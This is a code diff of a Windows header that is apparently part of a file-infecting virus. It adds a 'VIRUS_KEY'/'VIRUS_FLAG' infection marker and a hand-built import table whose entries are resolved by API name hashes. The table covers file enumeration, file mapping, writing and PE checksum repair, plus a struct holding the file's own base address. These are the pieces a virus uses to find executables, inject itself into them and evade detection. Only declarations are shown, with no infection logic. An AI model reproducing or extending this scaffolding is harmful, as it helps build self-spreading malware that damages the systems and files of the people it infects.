@@ -7,9 +7,11 @@
 #include <winternl.h>
 #include <imagehlp.h>
 
-#include <iostream>
+//#include <iostream>
+//using namespace std;
 
-using namespace std;
+#define VIRUS_KEY 0xF4
+#define VIRUS_FLAG ((VIRUS_KEY^0x7FFFFFFF)^0xF0F0F0F0)
 
 #define NtCurrentPeb()     (PPEB)(NtCurrentTeb()->ProcessEnvironmentBlock)
 
@@ -69,11 +71,20 @@ typedef DWORD (WINAPI* pGetFileSize)(
 
 typedef BOOL (WINAPI *pReadFile)(
     _In_ HANDLE hFile,
-    _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesRead) __out_data_source(FILE) LPVOID lpBuffer,
+    _Out_ LPVOID lpBuffer,
     _In_ DWORD nNumberOfBytesToRead,
     _Out_opt_ LPDWORD lpNumberOfBytesRead,
     _Inout_opt_ LPOVERLAPPED lpOverlapped
     );
+
+typedef BOOL (WINAPI *pWriteFile)(
+    HANDLE       hFile,
+    LPCVOID      lpBuffer,
+    DWORD        nNumberOfBytesToWrite,
+    LPDWORD      lpNumberOfBytesWritten,
+    LPOVERLAPPED lpOverlapped
+);
+
 
 typedef BOOL (WINAPI * pCloseHandle)(
     HANDLE hObject
@@ -129,34 +140,49 @@ typedef NTSTATUS (NTAPI *pNtClose)(
     IN  HANDLE Handle
     );
 
+typedef  DWORD (WINAPI* pGetEnvironmentVariableA)(
+    _In_opt_ LPCSTR lpName,
+    _Out_writes_to_opt_(nSize,return + 1) LPSTR lpBuffer,
+    _In_ DWORD nSize
+    );
+
 
 typedef struct _IAT
 {
     // kernel32.dll
-    pLoadLibraryExA     fnLoadLibraryExA;
-    pGetProcAddress     fnGetProcAddress;
+    pLoadLibraryExA             fnLoadLibraryExA;           // 0x1ad4f305
+    pGetProcAddress             fnGetProcAddress;           // 0xd38cd23
+    
+    pFindFirstFileA             fnFindFirstFileA;           // 0x10b03781
+    pFindNextFileA              fnFindNextFileA;            // 0x4d01d59
+    pFindClose                  fnFindClose;                // 0x309c47e0
 
-    pFindFirstFileA     fnFindFirstFileA;
-    pFindNextFileA      fnFindNextFileA;
-    pFindClose          fnFindClose;
+    pCreateFileA                fnCreateFileA;              // 0xc75869c
+    pGetFileSize                fnGetFileSize;              // 0x236f23d6
+    pReadFile                   fnReadFile;                 // 0xc9a21e1
+    pWriteFile                  fnWriteFile;                // 0x5ce6ec2
+    pCloseHandle                fnCloseHandle;              // 0x158bec59
 
-    pCreateFileA        fnCreateFileA;
-    pGetFileSize        fnGetFileSize;
-    pReadFile           fnReadFile;
-    pCloseHandle        fnCloseHandle;
+    pVirtualAlloc               fnVirtualAlloc;             // 0x22b92187
+    pVirtualFree                fnVirtualFree;              // 0x25e4c2e3
 
-    pVirtualAlloc       fnVirtualAlloc;
-    pVirtualFree        fnVirtualFree;
+    pCreateFileMappingA         fnCreateFileMappingA;       // 0x2da1e929
+    pMapViewOfFile              fnMapViewOfFile;            // 0x3a2ef895
+    pFlushViewOfFile            fnFlushViewOfFile;          // 0x29b0e5d7
+    pUnmapViewOfFile            fnUnmapViewOfFile;          // 0x12107238
 
-    pCreateFileMappingA fnCreateFileMappingA;
-    pMapViewOfFile      fnMapViewOfFile;
-    pFlushViewOfFile    fnFlushViewOfFile;
-    pUnmapViewOfFile    fnUnmapViewOfFile;
+    pGetEnvironmentVariableA    fnGetEnvironmentVariableA;  // 0x32b50861
 
     // ntdll.dll
-    pNtClose            fnNtClose;
+    pNtClose            fnNtClose;                          // 0x30b4218e
 
     // Imagehlp.dll
-    pCheckSumMappedFile fnCheckSumMappedFile;
+    pCheckSumMappedFile fnCheckSumMappedFile;               // 0xda56dc6
     
 } IAT, *PIAT;
+
+typedef struct _DATA
+{
+    PIAT iat;
+    PVOID this_file_base_address;
+} DATA, *PDATA;
